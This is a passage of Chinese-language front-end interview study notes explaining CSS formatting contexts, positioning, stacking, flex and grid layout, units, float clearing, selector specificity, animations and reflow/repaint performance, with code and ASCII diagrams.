│  ┌─────────┐                            │
│  │ Box 2   │                            │
│  └─────────┘                            │
│                                          │
│  ↑ BFC 外元素不受 BFC 内 margin 影响      │
└──────────────────────────────────────────┘
```

#### 2.3 如何触发 BFC

以下 CSS 属性会创建新的 BFC：

```css
/* 1. float 不为 none */
float: left;

/* 2. position 不为 static/relative（即 absolute/fixed/sticky） */
position: absolute;

/* 3. display 为 inline-block/flex/inline-flex/grid/inline-grid/table/... */
display: inline-block;
display: flex;
display: grid;

/* 4. overflow 不为 visible */
overflow: hidden;   /* 常用 */
overflow: auto;
overflow: scroll;

/* 5. 根元素 html 天然是 BFC */

/* 6. fieldset 元素天然是 BFC */

/* 7. display: flow-root（纯触发 BFC，无副作用） */
display: flow-root;
```

#### 2.4 BFC 应用场景

**场景1：阻止 margin 塌陷**
```html
<div class="parent">
  <div class="child" style="margin-top: 20px;"></div>
</div>

<!-- 解决方案：给父元素创建 BFC -->
<div class="parent" style="overflow: hidden;">
  <div class="child" style="margin-top: 20px;"></div>
</div>
```

**场景2：两栏布局（不让浮动覆盖）**
```css
.wrapper {
  overflow: hidden; /* 创建 BFC，不被浮动覆盖 */
}
.sidebar {
  float: left;
  width: 200px;
}
.content {
  overflow: hidden; /* 创建 BFC，自适应剩余宽度 */
}
```

**场景3：清除浮动（撑开父元素高度）**
```css
.clearfix {
  overflow: hidden; /* 浮动子元素参与高度计算 */
}
```

**场景4：阻止文字环绕浮动元素**
```css
.text {
  overflow: hidden; /* BFC，阻断与浮动的文本流关系 */
}
```

---

### 3. IFC / GFC / FFC 是什么

#### 3.1 IFC（Inline Formatting Context）

**IFC** 是行内格式化上下文，由行内级元素（inline/inline-block）参与形成。

**规则：**
- 盒子水平排列
- 垂直方向：baseline 对齐
- 一行放不下时换行（受 `white-space` 影响）
- `line-height` 决定行盒高度
- `vertical-align` 调整垂直对齐

```
┌─────────────────────────────────────────┐
│  行盒（Line Box）                        │
│  ┌───────┐      ┌─────────────┐         │
│  │ inline│      │inline-block │  ↑     │
│  │ text  │      │   height:   │  │     │
│  │       │      │   30px      │  │     │
│  └───────┘      └─────────────┘  │     │
│                      ↑           │     │
│  ┌─────────┐   ┌───┴───┐        │     │
│  │  img ↑  │   │ text  │  ↓      │     │
│  │(默认baseline)│      │        │     │
│  └─────────┘   └───────┘        ↓     │
└─────────────────────────────────────────┘
```

#### 3.2 FFC（Flex Formatting Context）

**FFC** 由 `display: flex/inline-flex` 创建，是弹性盒子的格式化上下文。

- 子元素变为 flex item
- flex item 不参与 BFC/IFC，按 flex 规则排列
- flex item 不支持 `float` 和 `clear`
- `vertical-align` 在 flex item 上无效

#### 3.3 GFC（Grid Formatting Context）

**GFC** 由 `display: grid/inline-grid` 创建，是网格布局的格式化上下文。

- 子元素变为 grid item
- 按网格轨道（grid track）排列
- 网格线（grid line）定义放置规则

```
┌────────────────────────────────────────┐
│          GFC（网格格式化上下文）          │
│                                        │
│  ┌──────────────┬──────────────┐      │
│  │  grid-item   │   grid-item   │  ← 行1│
│  │              │              │      │
│  ├──────────────┼──────────────┤      │
│  │  grid-item   │   grid-item   │  ← 行2│
│  │              │              │      │
│  └──────────────┴──────────────┘      │
│                                        │
└────────────────────────────────────────┘
```

---

### 4. position 属性

| 属性值 | 定位参照 | 是否脱离文档流 | 滚动时 |
|--------|---------|--------------|--------|
| `static` | 自然位置（无定位） | 否 | 随页面滚动 |
| `relative` | 自身原始位置 | 否（占据原位） | 随页面滚动 |
| `absolute` | 最近已定位祖先（不含 static） | 是 | 随页面滚动（若祖先 fixed 则随窗口） |
| `fixed` | 视口（viewport） | 是 | 不随页面滚动 |
| `sticky` | 视口 + 滚动容器（混合） | 否（占位） | 条件性固定 |

#### 4.1 相对定位（relative）

```css
.relative {
  position: relative;
  top: 10px;
  left: 20px;
  /* 相对于自身原始位置偏移 */
  /* 原位保留（其他元素不知道它偏移了） */
}
```

#### 4.2 绝对定位（absolute）

```css
/* 定位参照：最近已定位祖先 */
.parent {
  position: relative; /* 创建参照物 */
}
.child {
  position: absolute;
  top: 0;
  right: 0;
  /* 相对于 parent 右上角定位 */
}

/* 无已定位祖先 → 相对于初始包含块（html）定位 */
```

#### 4.3 固定定位（fixed）失效原因

```
┌──────────────────────────────────────────────────┐
│  fixed 失效的常见原因：                            │
│                                                  │
│  1. 祖先元素设置了 transform（即使 transform: none）│
│     → fixed 相对于 transform 祖先定位，而不是视口   │
│                                                  │
│  2. 祖先元素设置了 filter                         │
│     → 同样会创建新的堆叠上下文                     │
│                                                  │
│  3. 移动端 WebView 中 fixed 行为异常              │
│     → iOS Safari 使用惯性滚动时 fixed 会"飘"      │
│                                                  │
│  4. 使用了某些 CSS 属性导致创建了新的容器          │
│     → perspective, will-change 等                │
└──────────────────────────────────────────────────┘
```

**解决方案：**
```css
/* 将 fixed 元素移到 body 或更高层级 */
body {
  transform: none; /* 确保无 transform 干扰 */
}

/* 或使用 JS 在滚动时动态计算位置（iOS workaround） */
```

#### 4.4 粘性定位（sticky）

```css
.sticky {
  position: sticky;
  top: 10px;
  /* 滚动容器内的行为：
     1. 初始：正常文档流位置
     2. 滚动后距离顶部 < 10px 时：固定在 top: 10px
     3. 滚动出容器时：恢复文档流（不再固定） */
}
```

**sticky 原理：**
```
滚动容器
┌────────────────────────────────────────┐
│  初始位置                              │
│  ┌──────────────────────┐             │
│  │ sticky 元素          │  ← 正常文档流│
│  └──────────────────────┘             │
│                                        │
│  滚动至 sticky 阈值                   │
│  ══════════════════════════════ top:10px
│  ┌──────────────────────┐  固定不动   │
│  │ sticky 元素          │  ↑          │
│  └──────────────────────┘             │
│                                        │
│  继续滚动，sticky 随内容离开容器       │
│                                        │
└────────────────────────────────────────┘
```

**sticky 注意事项：**
- 必须指定 `top/left/right/bottom` 中的一个
- 父容器必须有明确的高度（不能是 `overflow: hidden` 裁剪了子元素）
- 父容器不能是 `overflow: hidden/auto`，否则 sticky 无法超出

#### 4.5 z-index 与层叠上下文

```css
.a { z-index: 1; }   /* 数值越大，越在上层 */
.b { z-index: 10; } /* 10 > 1，b 在 a 之上 */
```

**层叠上下文（Stacking Context）触发条件：**
```css
/* 以下属性会创建新的层叠上下文 */
position: relative/absolute/fixed + z-index !== auto;
position: fixed/sticky; /* 即使 z-index 是 auto 也创建 */
z-index !== auto;       /* flex 子元素 */
z-index !== auto;       /* grid 子元素 */
opacity < 1;
transform !== none;
filter !== none;
mix-blend-mode !== normal;
isolation: isolate;
will-change: <上述任意属性>;
-webkit-overflow-scrolling: touch; /* iOS */
```

**层叠等级（从低到高）：**
```
1. 块级盒（block boxes）
2. 浮动盒（float boxes）
3. 行内盒（inline boxes）
4. z-index: auto / z-index: 0 的定位元素
5. z-index: 正整数 的定位元素（数值越大越上层）
```

**z-index 失效的常见原因：**
```css
/* 1. 父元素没有创建层叠上下文，子元素 z-index 再高也受父限制 */
.parent1 { z-index: 100; } /* 未创建层叠上下文 */
.parent2 { z-index: 1; transform: scale(1); } /* 创建了层叠上下文 */
.child { z-index: 9999; }
/* child 虽然 z-index 很高，但因为在 parent1 内，
   所以不会超过 parent2 的子元素 */

.parent1 {
  position: relative;
  z-index: 100;
}
.parent2 {
  position: relative;
  z-index: 1;
  transform: scale(1); /* 创建层叠上下文 */
}

/* 2. 元素不是定位元素（position 不是 relative/absolute/fixed/sticky） */
.element { z-index: 999; } /* 无效！ */

/* 3. 层叠上下文嵌套，按父级上下文比较 */
```

---

### 5. Flex 布局原理，flex:1 含义

#### 5.1 Flex 布局基本概念

```
┌────────────────────────────────────────────────────┐
│                  flex container                     │
│                                                     │
│   ┌──────────┐  ┌──────────┐  ┌──────────┐         │
│   │ flex-   │  │ flex-   │  │ flex-   │         │
│   │ item 1  │  │ item 2  │  │ item 3  │         │
│   └──────────┘  └──────────┘  └──────────┘         │
│                                                     │
│  主轴（main axis）：默认水平，flex-direction 控制     │
│  交叉轴（cross axis）：默认垂直，与主轴垂直            │
│                                                     │
│  main start ──────────────────────────── main end   │
│  cross start                                        │
│              ↓                                     │
│            cross end                                │
└────────────────────────────────────────────────────┘
```

#### 5.2 flex 容器属性

```css
.container {
  display: flex;

  /* 主轴方向 */
  flex-direction: row | row-reverse | column | column-reverse;

  /* 换行规则 */
  flex-wrap: nowrap | wrap | wrap-reverse;

  /* 方向 + 换行（简写） */
  flex-flow: row wrap;

  /* 主轴对齐 */
  justify-content: flex-start | flex-end | center |
                   space-between | space-around | space-evenly;

  /* 交叉轴对齐 */
  align-items: stretch | flex-start | flex-end | center | baseline;

  /* 多行对齐（flex-wrap: wrap 时生效） */
  align-content: flex-start | flex-end | center |
                 space-between | space-around | stretch;
}
```

#### 5.3 flex item 属性

```css
.item {
  /* 分配剩余空间 */
  flex-grow: 0;   /* 默认0，不放大 */
  flex-shrink: 1; /* 默认1，可缩小 */
  flex-basis: auto; /* 初始基准尺寸 */

  /* flex 简写 */
  flex: 1;        /* = flex: 1 1 0% */
  flex: auto;     /* = flex: 1 1 auto */
  flex: none;     /* = flex: 0 0 auto */

  /* 单独对齐（覆盖 align-items） */
  align-self: auto | flex-start | flex-end | center | stretch | baseline;

  /* 排列顺序 */
  order: 0; /* 默认0，值越小越靠前 */
}
```

#### 5.4 flex:1 详解

```css
.item { flex: 1; }
/* 完整展开：flex-grow: 1; flex-shrink: 1; flex-basis: 0%; */

/* flex-basis: 0% 的含义：
   不以内容为基准，直接从 0 开始分配剩余空间 */

/* flex: 2 = flex: 2 1 0%（占 2 份） */
/* flex: 1 = flex: 1 1 0%（占 1 份） */
/* flex: 1 和 flex: 2 的元素，比例约为 1:2 */

/* flex: 1 vs flex: auto 的区别：
   flex: 1  → flex-basis: 0%，从 0 开始分配
   flex: auto → flex-basis: auto，保留内容尺寸后再分配

   例子：两个 flex: 1 的元素，内容分别为 "Hello" 和 "Hi"
   flex: 1（0%基准）：各占 50%（从 0 开始平分）
   flex: auto（auto基准）：先保留各自内容宽度，剩余空间平分 */
```

#### 5.5 flex-grow / shrink / basis 区别

| 属性 | 作用 | 默认值 | 数值含义 |
|------|------|--------|---------|
| `flex-grow` | 分配剩余空间 | 0 | 0=不分配；>0=按比例分配 |
| `flex-shrink` | 收纳溢出空间 | 1 | 0=不缩小；>0=按比例收缩 |
| `flex-basis` | 初始基准尺寸 | auto | auto=内容尺寸；固定值=固定宽度 |

```css
/* 分配剩余空间示例 */
.container { width: 600px; }
.item1 { flex-grow: 1; } /* 剩余 400px，获得 400px */
.item2 { flex-grow: 2; } /* 剩余 400px，获得 266.67px */

/* 收缩溢出空间示例 */
.container { width: 300px; }
.item1 { width: 200px; flex-shrink: 1; } /* 溢出 100px，贡献 50px */
.item2 { width: 400px; flex-shrink: 1; } /* 溢出 100px，贡献 50px */
/* 收缩量 = 溢出量 × (自身基准 / 所有基准之和) */
```

#### 5.6 常见 Flex 布局实战

```css
/* 1. 水平居中 */
.flex-center {
  display: flex;
  justify-content: center;
  align-items: center;
}

/* 2. 导航栏 */
.nav {
  display: flex;
  justify-content: space-between;
  align-items: center;
  height: 60px;
}

/* 3. Sticky Footer（页面最小高度时，footer 贴底） */
.page {
  display: flex;
  flex-direction: column;
  min-height: 100vh;
}
.content { flex: 1; }

/* 4. 三栏等高布局 */
.columns {
  display: flex;
  gap: 20px;
}
.column { flex: 1; } /* 自动等高（align-items: stretch 默认） */
```

---

### 6. Grid 布局，Grid vs Flex 区别

#### 6.1 Grid 基础

```css
.grid {
  display: grid;

  /* 定义列 */
  grid-template-columns: 200px 1fr 200px;
  grid-template-columns: repeat(3, 1fr);
  grid-template-columns: 100px auto 100px;
  grid-template-columns: minmax(100px, 1fr) 2fr;

  /* 定义行 */
  grid-template-rows: 100px auto 100px;
  grid-template-rows: repeat(3, minmax(50px, auto));

  /* 简写：grid-template（不建议混用） */
  grid-template: 100px auto / 1fr 1fr 1fr;

  /* gap */
  gap: 20px;
  column-gap: 20px;
  row-gap: 10px;

  /* 区域定义 */
  grid-template-areas:
    "header header header"
    "sidebar main aside"
    "footer footer footer";
}

/* 网格线编号定位 */
.item {
  grid-column: 1 / 3;  /* 从第1条线到第3条线（跨2列） */
  grid-column: 1 / span 2; /* 从第1条线跨2列 */
  grid-column: 1 / -1;  /* 贯穿所有列 */
  grid-row: 2 / 4;      /* 从第2条线到第4条线（跨2行） */
}

/* 命名区域定位 */
.header { grid-area: header; }
.sidebar { grid-area: sidebar; }
.main { grid-area: main; }
.footer { grid-area: footer; }

/* 隐式网格（自动创建行/列） */
grid-auto-rows: 100px; /* 自动创建的行高度 */
grid-auto-flow: row dense; /* dense 填充空白 */
```

#### 6.2 fr 单位与 minmax

```css
/* fr：fraction，剩余空间比例单位 */
grid-template-columns: 1fr 2fr 1fr;
/* 总共 4fr，第一列 1/4，第二列 2/4，第三列 1/4 */

grid-template-columns: repeat(3, 1fr);
/* 三等分 */

/* minmax(min, max)：尺寸范围 */
grid-template-columns: minmax(200px, 1fr) 1fr 1fr;
/* 第一列：最小 200px，最大 1fr */

/* auto-fill vs auto-fit */
grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
/* auto-fill：尽可能填入网格，空格保留 */
grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
/* auto-fit：所有空白压缩（让已有列占满） */

/* 实际效果对比：
   容器宽度 700px，每列 minmax(200px, 1fr)
   auto-fill: 3列 → 实际 4列（200*3=600，1列空白）
   auto-fit:  3列 → 列宽自动扩展填满 700px */
```

#### 6.3 Grid vs Flex 区别

| 特性 | Flexbox | Grid |
|------|---------|------|
| 维度 | 一维（行或列） | 二维（行和列） |
| 布局方向 | 单轴线排列 | 网格轨道排列 |
| 适用场景 | 导航栏、列表、卡片组、居中 | 页面整体布局、数据表格、相册 |
| 对齐方向 | 主轴 + 交叉轴两个方向 | 行对齐 + 列对齐 |
| 项目定位 | 按顺序/方向排列 | 可精确指定行列位置 |
| 内容驱动 | flex-grow 分配剩余空间 | 由轨道定义决定尺寸 |
| 空间利用 | 适合内容不规则的流式布局 | 适合规则对齐的网格式布局 |

```css
/* Flex：适合内容驱动的单行/单列 */
.flex-nav {
  display: flex;
  gap: 20px;
}
.flex-nav a {
  padding: 8px 16px;
  /* 每个 a 根据内容自适应宽度 */
}

/* Grid：适合二维网格 */
.grid-gallery {
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
  gap: 16px;
}
.gallery-item:nth-child(1) {
  grid-column: span 2; /* 某些项目可跨列 */
}
.gallery-item:nth-child(4) {
  grid-row: span 2;   /* 某些项目可跨行 */
}
```

---

### 7. rem / em / vw / vh / vmin / vmax 区别，px 为什么不是绝对单位

#### 7.1 各单位详解

| 单位 | 定义 | 说明 |
|------|------|------|
| `px` | 像素 | 屏幕物理像素的 CSS 映射，非绝对单位 |
| `em` | 相对于自身 font-size | 无 font-size 时继承祖先 |
| `rem` | 相对于根元素 html 的 font-size | 通常 16px（浏览器默认值） |
| `vw` | 视口宽度的 1% | `100vw` = 视口宽度 |
| `vh` | 视口高度的 1% | `100vh` = 视口高度 |
| `vmin` | vw 和 vh 中较小值的 1% | 移动端横竖屏适配 |
| `vmax` | vw 和 vh 中较大值的 1% | 同上 |

```css
/* rem 示例：响应式字体 */
html { font-size: 16px; }
@media (max-width: 768px) {
  html { font-size: 14px; }
}
h1 { font-size: 2rem; } /* 桌面32px，移动28px */
p { font-size: 1rem; }

/* vw 示例：流体字体 */
h1 {
  font-size: clamp(24px, 5vw, 48px);
  /* 最小24px，随视口增长，最大48px */
}

/* em 示例：相对于自身 font-size */
p { font-size: 16px; line-height: 1.5em; /* 24px */ }
p strong { font-size: 1.25em; /* 16*1.25=20px */ }

/* vmin/vmax 示例：全屏容器 */
.hero {
  width: 100vmin; /* 宽高较小的那个的100% */
  height: 100vmin;
}
```

#### 7.2 px 为什么不是绝对单位

传统认为 px 是"绝对单位"是因为它映射到屏幕物理像素。然而在现代显示设备上：

1. **设备像素比（DPR）**：`window.devicePixelRatio`，1 CSS px 可能对应 2 个或 3 个物理像素
   - iPhone Retina 屏幕：dpr=2，1 CSS px = 2 物理像素
   - 高分辨率屏幕：1 CSS px 可能跨越多个物理像素

2. **分辨率无关的真正绝对单位**：`cm`, `mm`, `in`, `pt`
   ```css
   .real-absolute {
     width: 1in; /* 在任何设备上物理上都是1英寸 */
     /* 但在屏幕上的实际像素取决于屏幕PPI */
   }
   ```
   这些单位基于物理尺寸（1in = 2.54cm），在屏幕上的渲染依赖屏幕 PPI，在屏幕上**也不是真正绝对**的。

3. **px 在屏幕上是相对的单位**：取决于输出介质的分辨率

---

### 8. 响应式布局，媒体查询，双栏/三栏布局，圣杯 vs 双飞翼

#### 8.1 响应式布局核心

```css
/* 移动优先：min-width（逐步增强） */
/* 桌面优先：max-width（逐步降级） */

/* 断点参考 */
@media (min-width: 576px)  { /* 小屏手机 */ }
@media (min-width: 768px)  { /* 平板 */ }
@media (min-width: 992px)  { /* 小屏笔记本 */ }
@media (min-width: 1200px) { /* 大屏桌面 */ }
@media (min-width: 1400px) { /* 超大屏 */ }
```

#### 8.2 双栏布局

```css
/* 方式1：flexbox */
.layout {
  display: flex;
  gap: 20px;
}
.sidebar { width: 200px; flex-shrink: 0; }
.main { flex: 1; min-width: 0; }

/* 方式2：grid */
.layout {
  display: grid;
  grid-template-columns: 200px 1fr;
  gap: 20px;
}

/* 移动端：堆叠 */
@media (max-width: 768px) {
  .layout { flex-direction: column; }
  .sidebar { width: 100%; }
}
```

#### 8.3 三栏布局

```css
/* 方式1：flexbox */
.layout {
  display: flex;
}
.left, .right { width: 200px; flex-shrink: 0; }
.center { flex: 1; min-width: 0; }

/* 方式2：grid */
.layout {
  display: grid;
  grid-template-columns: 200px 1fr 200px;
}

/* 方式3：position */
.layout { position: relative; }
.left, .right { position: absolute; top: 0; width: 200px; }
.left { left: 0; }
.right { right: 0; }
.center { margin: 0 200px; }
```

#### 8.4 圣杯布局 vs 双飞翼布局

两种经典的三栏布局，解决"main 区域优先加载"和"三栏等高"问题。

**圣杯布局（Holy Grail）：**

```html
<div class="holy-grail">
  <header>Header</header>
  <div class="bd">
    <main class="main">Main</main>
    <nav class="nav">Nav</nav>
    <aside class="aside">Aside</aside>
  </div>
  <footer>Footer</footer>
</div>
```

```css
.holy-grail .bd {
  padding: 0 200px; /* 为左右栏留位置 */
  min-width: 500px;
}
.holy-grail .main {
  float: left; width: 100%;
}
.holy-grail .nav {
  float: left; width: 200px;
  margin-left: -100%;   /* 移到最左 */
  position: relative;
  left: -200px;
}
.holy-grail .aside {
  float: left; width: 200px;
  margin-left: -200px;
  position: relative;
  right: -200px;
}
```

**双飞翼布局：**（淘宝提出，比圣杯少用一层 relative）

```html
<div class="double-wing">
  <header>Header</header>
  <div class="bd">
    <main class="main-wrap">
      <div class="main">Main</div>
    </main>
    <nav class="nav">Nav</nav>
    <aside class="aside">Aside</aside>
  </div>
  <footer>Footer</footer>
</div>
```

```css
.double-wing .main-wrap {
  float: left; width: 100%;
}
.double-wing .main {
  margin: 0 200px; /* main 自身加 margin */
}
.double-wing .nav {
  float: left; width: 200px;
  margin-left: -100%;
}
.double-wing .aside {
  float: left; width: 200px;
  margin-left: -200px;
}
```

**核心原理图（圣杯）：**
```
初始（浮动）：
┌────────┬────────┬────────┐
│ Main   │  Nav   │ Aside │  ← 全浮动，main 宽度100%，左右栏被挤到下一行
└────────┴────────┴────────┘

margin-left 负值拉回：
第一行：Main（width:100%）
第二行：[Nav][Aside]
       ↑ margin-left:-100% 拉 Nav 到第一行最左
       ↑ margin-left:-200px 拉 Aside 到第一行最右

最终（加 padding + relative 偏移）：
┌────────────────────────────────┐
│ ████padding-left████padding-right████ │
│ ███Nav████│████Main████│██Aside██ │
└────────────────────────────────┘
```

**圣杯 vs 双飞翼 区别：**
- 圣杯：`main` 无专属容器，用 `padding` + `relative` 调整
- 双飞翼：`main` 有专属包裹容器，用 `margin` 调整，避免 `relative`
- 双飞翼更简洁，避免了圣杯中 `relative` 定位的问题（如 overflow 裁剪）

---

### 9. 浮动原理，清除浮动方式，overflow:hidden 清除浮动原理

#### 9.1 浮动原理

```
浮动元素脱离文档流，但不完全脱离：
1. 浮动元素从正常流中抽出，位置向左/右移动
2. 后续块级元素忽略浮动（但行内元素感知浮动）
3. 浮动元素在行框内排列（行内内容围绕浮动元素）

正常文档流：
┌─────┐ ┌─────┐ ┌─────┐
│  A  │ │  B  │ │  C  │  ← 块级元素垂直排列
└─────┘ └─────┘ └─────┘

A 左浮动后：
┌────────┐
│   A    │  ┌──┐  ┌──┐
└────────┘  │B │  │C │  ← B/C 占据 A 右侧空间（块级不感知浮动）
            └──┘  └──┘
             ↑ 行内内容围绕 B（左浮动）
```

#### 9.2 清除浮动方式

**方式1：clear 属性**
```css
.clearfix::after {
  content: '';
  display: block;
  clear: both;
}
```

**方式2：BFC 清除浮动**
```css
.float-container {
  overflow: hidden; /* 或 auto */
}
```

**方式3：display: flow-root（推荐，无副作用）**
```css
.float-container {
  display: flow-root;
  /* 专门用于创建 BFC，不引入任何副作用 */
}
```

#### 9.3 overflow:hidden 清除浮动的原理

```
overflow: hidden 触发 BFC（块格式化上下文）
→ BFC 的特性：计算高度时，浮动子元素也参与计算
→ 所以父容器被浮动子元素撑开
→ 视觉上等于"清除了浮动"

┌──────────────────────┐
│ float-child    ↑    │  ← float-child 仍在文档中
│                │撑开父元素 │
└──────────────────────┘
```

---

### 10. CSS 选择器优先级，!important 为什么不推荐

#### 10.1 优先级计算（Specificity）

```
优先级 = (ID选择器数量, 类/属性/伪类数量, 元素/伪元素数量)

计算规则：
内联样式   → 1,0,0,0  （style="..."）
ID 选择器  → 0,1,0,0  （#app）
类/属性/伪类 → 0,0,1,0  （.btn, [type="text"], :hover）
元素/伪元素  → 0,0,0,1  （div, ::before）

比较规则：从左到右逐位比较
(1,0,0,0) > (0,9,0,0) > (0,0,9,0) > (0,0,0,9)
```

```css
/* 0,0,1,0 */
.class1 { color: blue; }

/* 0,0,0,2 */
div p { color: green; } /* div + p = 2 elements */

/* 0,1,0,0 */
#id { color: red; }

/* 1,0,0,0 */
[style="color:purple"] { color: purple; }

/* (0,1,1,1) */
.wrapper .main h1 { color: orange; }

/* !important 优先级最高（但会打破级联） */
button { color: red !important; }
```

#### 10.2 !important 为什么不推荐

1. **打破级联**：覆盖任何选择器，降低样式系统的可预测性
2. **难以维护**：后期开发者只能再加 `!important` 覆盖，造成恶性循环
3. **Bugs 难排查**：`!important` 散落各处，样式冲突难定位
4. **响应式/动态样式失效**：媒体查询等条件样式可能被 `!important` 意外覆盖

```css
/* 反面示例 */
.btn { color: red !important; background: blue !important; }
.button { color: blue !important; } /* 恶性循环开始 */
#submit-btn { color: green !important; } /* 继续加 */
button { color: yellow !important; } /* 最后变成 !important 大混战 */
```

**正确的解决方式：**
```css
/* 提升选择器优先级，而不是用 !important */
.wrapper .button { color: red; } /* 变成 (0,2,0,1) */
#app .button { color: red; }     /* 变成 (1,1,0,1) */
```

---

### 11. nth-child vs nth-of-type，::before vs :before

#### 11.1 nth-child vs nth-of-type

```html
<div class="container">
  <p>第一个段落</p>    <!-- p:nth-child(1) ✓  p:nth-of-type(1) ✓ -->
  <p>第二个段落</p>    <!-- p:nth-child(2) ✓  p:nth-of-type(2) ✓ -->
  <span>第一个 span</span> <!-- span:nth-child(3) ✓ span:nth-of-type(1) ✓ -->
  <p>第三个段落</p>    <!-- p:nth-child(4) ✓  p:nth-of-type(3) ✓ -->
  <p>第四个段落</p>    <!-- p:nth-child(5) ✓  p:nth-of-type(4) ✓ -->
</div>
```

```css
/* nth-child(n)：先选第 n 个子节点，再看类型是否匹配 */
p:nth-child(2)  { color: red; }
/* 选择：作为第 2 个子节点 且 是 p 元素的节点 */

/* nth-of-type(n)：先选同类型中的第 n 个 */
p:nth-of-type(2) { color: blue; }
/* 选择：作为 p 元素中的第 2 个 */

/* 负向选择 */
li:nth-child(odd)      { } /* 奇数个子节点 */
li:nth-child(even)     { } /* 偶数个子节点 */
li:nth-child(2n+1)     { } /* 同 odd */
li:nth-child(3n)       { } /* 3的倍数 */
li:nth-child(-n+3)     { } /* 前3个 */
li:nth-last-child(1)   { } /* 倒数第1个 */
```

#### 11.2 ::before vs :before

| 写法 | 含义 | 兼容性 |
|------|------|--------|
| `:before` | CSS2 语法（单冒号） | IE8+ |
| `::before` | CSS3 语法（双冒号） | 现代浏览器 |

```css
/* ::before 和 ::after 是伪元素（pseudo-elements） */
/* :hover 和 :focus 是伪类（pseudo-classes） */

/* 正确：双冒号 */
p::before {
  content: '前缀 ';    /* content 必须写，即使空内容也要 content: '' */
  color: #999;
}

p::after {
  content: ' 后缀';
  display: block;
}

/* 单冒号是 CSS2 的旧写法，效果一样，但不推荐 */
```

---

### 12. transition vs animation 区别，CSS 动画性能差的原因，transform 性能更好原因

#### 12.1 transition vs animation

| 特性 | transition | animation |
|------|-----------|-----------|
| 触发方式 | 需要状态改变（hover/JS/class变化） | 自动/循环播放 |
| 定义帧数 | 只能定义开始和结束（两帧） | 可定义多帧（关键帧） |
| 循环 | 需要额外触发 | `animation-iteration-count: infinite` |
| 控制 | 简单，不能暂停/倒退 | 丰富（暂停/倒退/延迟） |

```css
/* transition：两帧过渡 */
.box {
  width: 100px;
  transition: width 0.3s ease, background 0.5s ease;
}
.box:hover {
  width: 200px;
  background: red;
}

/* animation：多帧动画 */
@keyframes slideIn {
  0%   { transform: translateX(-100%); opacity: 0; }
  50%  { transform: translateX(10px); opacity: 0.5; }
  100% { transform: translateX(0); opacity: 1; }
}
.slide {
  animation: slideIn 0.5s ease-out;
}
```

#### 12.2 CSS 动画性能差的原因

**性能差的 CSS 属性（触发布局/重绘）：**
- `width`, `height`
- `margin`, `padding`
- `top`, `left`, `right`, `bottom`
- `font-size`, `font-family`
- `border-width`, `border-color`
- `background`
- `color`

```
触发布局（reflow）→ 重新计算几何属性 → 重新绘制
                    ↑ 最昂贵
```

**动画性能好的 CSS 属性：**
- `transform`（translate, scale, rotate）
- `opacity`

```
触发合成（composite）→ 仅 GPU 合成，不触发布局/重绘
                        ↑ 最优
```

#### 12.3 transform 性能更好的原因

```
浏览器渲染流水线（Pipeline）：

1. JavaScript（JS 线程）
         ↓
2. Style（计算样式）
         ↓
3. Layout（计算几何/位置）  ← transform 不触发
         ↓
4. Paint（填充像素）        ← transform 不触发
         ↓
5. Composite（合成层）       ← transform 在此层操作
         ↓
6. 显示在屏幕上

transform → 只在 Composite 阶段处理
         → 不需要 Layout/Paint
         → 直接由 GPU 合成，操作合成层（compositor layer）

opacity   → 仅在 Composite 阶段处理
         → 同样高效
```

---

### 13. 回流（reflow）vs 重绘（repaint），如何减少回流

#### 13.1 渲染流水线

```
DOM Tree → Style → Layout → Paint → Composite
                      ↑        ↑
                   回流      重绘
                   (reflow)  (repaint)
                   (最重)    (中等)
                               ↓
                            Composite
                            (最轻)
```

- **回流（reflow）**：几何属性改变，元素大小/位置/布局重新计算
- **重绘（repaint）**：外观改变，但不影响几何属性（如 color, visibility, background）

**回流必定触发重绘，重绘不一定回流。**

#### 13.2 触发回流的操作

```javascript
// 读取布局属性（offset, scroll, client, getBoundingClientRect）
const width = el.offsetWidth;   // 触发回流
const height = el.scrollHeight; // 触发回流
el.clientTop;                   // 触发回流
el.getBoundingClientRect();     // 触发回流

// 修改布局相关属性
el.style.width = '200px';      // 触发回流
el.style.padding = '10px';     // 触发回流
el.style.margin = '20px';      // 触发回流
el.style.fontSize = '20px';    // 触发回流

// 添加/移除 DOM 元素
document.body.appendChild(child); // 触发回流

// 改变元素尺寸/内容
el.innerHTML = '新内容';         // 触发回流
```

#### 13.3 如何减少回流

**原则：读操作和写操作分离，批量写，动画用 transform**

```javascript
// ❌ 错误：交替读写，触发多次回流
el.style.width = el.offsetWidth + 10 + 'px';
el.style.height = el.offsetHeight + 10 + 'px';

// ✅ 正确：读操作集中，写操作集中
const width = el.offsetWidth;
const height = el.offsetHeight;
requestAnimationFrame(() => {
  el.style.transform = `translate(${width + 10}px, ${height + 10}px)`;
});
```

**CSS 优化策略：**
```css
/* 1. 动画使用 transform/opacity */
.animated {
  animation: move 1s ease;
}
@keyframes move {
  0%   { transform: translateX(0); }
  100% { transform: translateX(100px); }
}

/* 2. 使用 will-change 提前创建合成层 */
.animated {
  will-change: transform;
}

/* 3. 批量修改 DOM（离线操作） */
const el = document.getElementById('list');
el.style.display = 'none';        // 脱离渲染树
modifyDOM();
el.style.display = 'block';       // 重新渲染（只触发一次回流）

/* 4. 避免设置多项内联样式（用 class 替代） */
el.classList.add('large-size');   /* 好 */
el.style.width = '200px';          /* 差 */
```

---

### 14. transform 为什么不触发回流，GPU 加速原理，will-change

#### 14.1 transform 不触发回流的原因

```
┌─────────────────────────────────────────────────────────┐
│  渲染流水线：                                            │
│                                                         │
│  DOM → Style → Layout → Paint → Composite → 显示         │
│                      ↑          ↑         ↑             │
│                    回流        重绘       GPU合成        │
│                  (昂贵)      (中等)      (快速)          │
│                                                         │
│  transform/opacity 变化：                                │
│  DOM → Style → [跳过Layout] → [跳过Paint] → Composite →  │
│                                                         │
│  浏览器知道这些变化不影响几何属性，                        │
│  可以直接交给 GPU 处理 → 不触发回流/重绘                   │
└─────────────────────────────────────────────────────────┘
```

#### 14.2 GPU 加速原理

**为什么 GPU 加速快？**
- GPU 是专门处理图像并行计算的硬件（数千个核心）
- CSS 渲染合成层时，GPU 直接在内存中处理像素，不经过 CPU
- 合成层独立于主线程，主线程 JS 阻塞不影响动画

**什么时候创建合成层（Compositor Layer）？**
```css
/* 1. 3D/透视变换 */
transform: translate3d(0, 0, 0);
transform: perspective(1000px);

/* 2. will-change 提示 */
will-change: transform;
will-change: opacity;

/* 3. video / canvas / iframe */

/* 4. 动画或过渡的 opacity / transform */

